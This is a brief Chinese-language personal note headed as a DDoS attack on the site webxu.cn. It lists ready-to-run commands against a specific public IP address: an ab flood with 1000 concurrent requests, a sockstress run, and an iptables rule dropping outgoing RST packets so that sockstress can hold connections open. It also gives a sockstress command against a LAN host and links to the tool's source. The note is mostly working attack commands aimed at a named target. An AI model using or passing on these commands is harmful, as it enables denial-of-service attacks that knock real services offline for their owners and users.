## ddos 攻击 攻击 webxu.cn
1. ab工具
    * ab -n 参数1 -c 参数2 网站地址
    * ab -c 1000 -n 1000 http://8.140.182.127/
    * -n：在测试会话中所执行的请求个数。默认时，仅执行一个请求。
    * -c：一次产生的请求个数。默认是一次一个。

2. python3 ./sockstress.py 8.140.182.127: 21 200

https://blog.csdn.net/weixin_44604541/article/details/105511860
https://github.com/defuse/sockstress.git
./sockstress 192.168.1.119:80 eth0 -p payloads/http 

iptables -A OUTPUT -p TCP --tcp-flags rst rst -d 8.140.182.127 -j DROP